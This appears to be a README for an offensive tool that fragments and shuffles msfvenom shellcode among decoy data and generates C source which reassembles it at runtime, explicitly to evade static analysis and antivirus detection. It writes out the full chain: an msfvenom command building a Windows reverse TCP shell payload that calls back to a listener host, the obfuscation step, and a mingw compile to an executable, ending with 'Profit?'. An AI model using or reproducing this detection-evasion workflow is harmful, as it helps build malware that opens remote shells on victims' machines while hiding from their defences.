Takes a given shellcode file (generated using msfvenom, for example), shuffle and randomise the shellcode, then generate a C source file to be compiled. 
WIP

- Obfuscation Through Memory Manipulation: By using `memcpy` to dynamically assemble the shellcode in memory, effectively hiding the malicious code from static analysis tools.
- Dynamic Reassembly at Runtime: The shellcode is only assembled and becomes recognizable as such during runtime, which helps in evading detection mechanisms that scan executable files before they are run.
- Flexibility: Can be applied to various types of shellcode as long as they are compatible with Windows.

## Usage

Using a shellcode file, using `msfvenom`, for example:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=9001 -e x86/shikata_ga_nai -i 8 -f c > shellcode.c
```
Use the script to obfuscate the shellcode:

```bash
./shellcode_obfuscator.py -s shellcode.c -dm 30 -c 5 -df mr.bean_wikipedia.html -db 60 -min 3 -max 5 -fm 10 
Shellcode size: 540 bytes
Decoy size: 585859 bytes
Fragment count: 4278
File size: 1433798 bytes
File saved to shell.c
```
Compile:

```bash
i686-w64-mingw32-gcc shell.c -o shell.exe
```
Profit?

## Options

`-s` / `--shellcode-file`: Specifies the input file containing the shellcode. This file should contain the shellcode that will be obfuscated by the script. The shellcode is expected to be in a raw binary or hexadecimal format.

`-o` / `--output`: Designates the output file name for the generated C source code. If not specified, the script defaults to creating a file named `shell.c`. This file will contain the obfuscated shellcode.

`-c` / `--chunks`: Sets the number of chunks into which the shellcode will be split. The script divides the shellcode into this specified number of parts for obfuscation. A lower number results in fewer, larger chunks, while a higher number creates more, smaller chunks.

`-df` / `--decoy-file`: Specifies an optional decoy file. The content of this file is used to create additional obfuscated fragments within the generated C source. If not provided, the script will only use randomly generated decoy data.

`-db` / `--decoy-bias`: Determines the likelihood (in percent) that fragments from the decoy file will be used in the generated C source. A higher value increases the probability of using decoy file content in the obfuscation process.

`-dm` / `--decoy-multiplier`: Defines the ratio of decoy fragments to real shellcode fragments. For example, a value of 4 means there will be four times as many decoy fragments as real shellcode fragments. This enhances the obfuscation by adding more non-functional code fragments.

`-min` / `--min-frag-size`: Sets the minimum size for each fragment in bytes. This parameter controls the smallest allowable size for both shellcode and decoy fragments. Smaller fragment sizes can lead to more complex obfuscation.

`-max` / `--max-frag-size`: Specifies the maximum size for each fragment in bytes. It sets the upper limit for the size of the fragments. Larger fragments can reduce complexity but may be less obfuscated.

`-fm` / `--fragment_multiplier`: Affects the length of decoy fragments. This multiplier is applied to the length of decoy fragments, allowing for variability in their size compared to real shellcode fragments. A higher value results in longer decoy fragments.
